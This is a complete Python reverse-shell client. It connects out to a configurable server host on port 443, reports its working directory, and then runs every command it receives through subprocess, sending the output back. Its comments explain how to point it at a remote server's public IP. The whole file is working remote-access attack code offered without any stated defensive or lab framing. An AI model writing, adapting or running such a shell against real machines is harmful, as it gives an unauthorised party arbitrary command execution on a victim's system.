import socket
import os
import subprocess
import sys

""" Constants 

These defaults will work for testing both the client and server on the
same machine; for remote access, ensure the SERVER_HOST address is 
replaced with the server's public IP.

If desired, these constants can be moved to a dotenv configuration file.
"""
SERVER_HOST = '127.0.0.1' # Public IP of server
SERVER_PORT = 443 # Open port on server
BUFFER_SIZE = 1024 * 128 # 128KB max mesxage; can be reconfigured as desired
SEPARATOR = '<sep>' # Separator between multiple sent messages

s = socket.socket()
s.connect((SERVER_HOST, SERVER_PORT))
cwd = os.getcwd()
s.send(cwd.encode())
print('Successfully connected to server.')

while True:
    command = s.recv(BUFFER_SIZE).decode()
    split_command = command.split()
    if command.lower() == 'exit':
        break
    if split_command[0].lower() == 'cd':
        try:
            os.chdir(' '.join(split_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ''
    else:
        output = subprocess.getoutput(command)
    cwd = os.getcwd()
    message = f'{output}{SEPARATOR}{cwd}'
    s.send(message.encode())
s.close()